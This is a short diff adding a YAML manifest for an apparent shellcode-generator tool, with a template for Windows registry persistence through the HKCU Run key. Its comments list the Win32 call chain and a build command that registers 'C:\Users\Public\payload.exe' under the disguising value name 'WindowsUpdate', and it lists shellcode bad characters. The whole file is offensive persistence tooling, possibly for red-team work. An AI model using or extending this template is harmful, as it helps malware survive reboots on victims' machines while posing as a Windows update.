@@ -1,0 +1,11 @@
+# Registry persistence via HKCU Run key
+# IR workflow: LoadLibraryA(advapi32) -> RegOpenKeyExA -> lstrlenA ->
+#              RegSetValueExA -> RegCloseKey -> exit
+#
+# Build:
+#   uv run emitrion emitrion/manifests/registry_persistence.yaml \
+#       --exe-path "C:\Users\Public\payload.exe" \
+#       --reg-value-name "WindowsUpdate" \
+#       --no-assemble --out emitter_out/
+template: ir_registry_persistence
+badchars: ["00", "0A", "0D"]
